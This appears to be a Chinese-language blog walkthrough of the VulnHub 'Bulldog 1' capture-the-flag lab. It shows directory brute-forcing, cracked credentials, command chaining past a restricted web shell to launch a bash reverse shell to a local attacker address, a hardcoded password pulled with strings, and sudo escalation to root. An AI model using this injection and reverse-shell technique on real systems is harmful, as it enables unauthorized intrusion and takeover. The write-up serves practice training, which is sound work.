> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DpUDtrgWozJt43HVMNSbVw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **49** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/leMkDaXRbiboDwJS3ickCDzX18rO7YT3QKjDn2b7PFbb9VqmfDhlTtobtDvDHuAXEibFmZs7HL7W0Wq66sSl7vk2w/640?wx_fmt=png)

  

  

靶机地址：https://www.vulnhub.com/entry/bulldog-1,211/

靶机难度：初级（CTF）

靶机发布日期：2017 年 8 月 28 日

靶机描述：

Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)

This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!

Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That's my only hint ;)

Made by Nick Frichette (frichetten.com) Twitter: @frichette_n

I'd highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn't have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYjn3I3OsdM2jGHhYmibiaFekxawFb17L882xSlDwtCPNR1rZ6umQwPVAg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYsABx9kSvq3Cy61ibP3Y51ficO2TPTViakOOufbk0zEg4NOMPzVGMgv18Q/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.140

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYI9tA42cqB1FCBdGKeocicFWy533W0NRBmGSniaUmXfv3AgzDX77kxICw/640?wx_fmt=png)

nmap 发现开放了 23、80、8080 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYLYANFtY25qhCsAvsZAhkHzg8HdQtTE10cLMkL0M9Pwp5pJ0WfS4m8w/640?wx_fmt=png)

法斗....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYhiauib4auia0fPDV95TSwVVVJl5boW1vFPjUvSzYf7CcjHtbXWMAvh6OA/640?wx_fmt=png)

这是说解雇了所有技术人员，因为发现被入侵了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYaQ9CfIkQOoRHl5YyiaoB0yR2ibYaffLMQ29lVsn6krc3eiazHnw0odTeA/640?wx_fmt=png)

dirb 爆破发现了 admin 和 devURL...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYJpRE4nEnV81PK9CWRFdM2nUdoBTicKliaogXWaBUWpvOIzdeckaW447Q/640?wx_fmt=png)

这是一个登陆页面...admin 默认密码无法登录...

sql 注入也不行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYlvsK1e6EfYo3UsiaDNks63EVuBuT0yydDZgWBjDr1cENXuYocJiaBm4A/640?wx_fmt=png)

意思是说 APT 利用了 Web 服务器中的一个漏洞... 他们从新服务器中完全删除 PHP... 也不会使用 PHPMyAdmin 或任何其他流行的 CMS 系统..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYarftoMJ6TIRFlrmtuAhIVyae040rOmDsGtZz9AibAnnQNjPdVVZ8mZw/640?wx_fmt=png)

点进去

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYnicXZicriag4JZ8901pDj7ZtMSRBbEk7eX95icibnWK6oAsAJic9A5sNv5wQ/640?wx_fmt=png)

需要服务器验证才能使用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojY6114d9WxhdkvDF9icry6TXgiaPZicAIWGwBQVmPuJuDns487V2dYswZ2A/640?wx_fmt=png)

在 dev 前端源码发现了 MD5 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYZFia0MYiat8icMx9EqFyqSVrxSibZMEQbYcjeNw0T8J4TTvnvibxDs8oAbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojY7NkrrGWLqzzCb7Q1seicypveNIBopA3WloxRQJYFtHQrancdXqibvJCA/640?wx_fmt=png)

等等，发现了 nick/bulldog sarah/bulldoglover 等... 这里账号已经前面就有了，邮箱地址前面就是账号...

两个账号都能登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYib2WhwVE2a9vhBicxCRlBFD42LoBGnGEP7o2EcgLk8iaiaMicvdslShntqA/640?wx_fmt=png)

这里我使用了 nick/bulldog 登录... 无权编辑任何内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYsrIczMTKrIpYfBlxM7nS595byxvVzj0lsIWd2iaQmusjjnDvTpaenHw/640?wx_fmt=png)

我返回 webshell 发现可以使用了... 应该是登录了问题

```
ifconfig
ls
echo
pwd
cat
rm
```

这里给了六个命令，执行别的都不行...

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYYoYhC1GTu2uJG7m2uj35vc5AsQH4B6KrBZAOibd2QYOSAvMPKXAesMg/640?wx_fmt=png)

```
ls &&echo "bash -i >& /dev/tcp/192.168.56.103/1234 0>&1" | bash
```

成功提 shell，这里很多种玩的方法，任你们玩...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYUULSialhFldOpbXILweSqyuOLnUrevn13s1r9F0zaricbh63q7icIZeWA/640?wx_fmt=png)

发现 bulldogaadmin... 可以提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYUKHQzCfg44fiajVFuK32jFkphBOfQGawicAEKD5QF9fziaibb9lMxGDRzw/640?wx_fmt=png)

```
find / -user bulldogadmin 2>/dev/null
```

第一眼看到了 customPermissionApp，比较显眼... 看它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYKhOSjFqqc4nA6XCbLvAKldorvCvib7qkQOTfEwT9zeibibhPCnCdGDQHQ/640?wx_fmt=png)

使用 exiftool 没安装... 使用了 strings 查看...

直接获得密码：

```
SUPERultimatePASSWORDyouCANTget
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYMBFRhPeOqibia9MOic4o7zC7MAYTfHfVSQUxSlEcMUL7fbV01aRCcgV5A/640?wx_fmt=png)

可以看到可以使用 sudo... 需要 TTY...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfE9VKUO6d324ENKlicvojYJ0iakk0I8ZYCXaxPZWgBJCeiccgEibcFZunGKdCwzI7YWUvWxnaRIc0TQ/640?wx_fmt=png)

python 提到 TTY 之后，提示我可以直接提权了...

成功提到 root 权限，并查看 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/leMkDaXRbiboDwJS3ickCDzX18rO7YT3QKjDn2b7PFbb9VqmfDhlTtobtDvDHuAXEibFmZs7HL7W0Wq66sSl7vk2w/640?wx_fmt=png)

  

  

比较简单的一台靶机... 加油！

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)